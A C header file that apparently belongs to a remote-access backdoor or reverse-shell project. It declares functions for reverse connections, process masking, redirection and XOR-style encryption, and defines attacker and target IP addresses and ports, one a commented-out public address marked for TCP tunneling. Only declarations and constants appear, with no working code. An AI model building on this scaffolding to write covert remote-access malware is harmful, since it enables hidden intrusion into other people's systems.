#ifndef HEADERS_H
#define HEADERS_H


/*int reverseConnection();
int connection();*/
void mainMenu(int connID);
int communication();

void redirection(int connID);

void maskProc(int argc, char *argv[]);
void safeSend(int connID, char *msg);
void decrypt(char *input, int len, char key);
void cipher(char *msg, int msg_len);



/*#define ATTACKER_IP "147.185.221.211"
#define ATTACKER_PORT "32493" */ //TCP tunneling
#define ATTACKER_IP "192.168.1.61"
#define ATTACKER_PORT 22

#define TARGET_IP "192.168.1.109"
#define TARGET_PORT 8989

#define CIPHER_KEY 0xAB

#endif
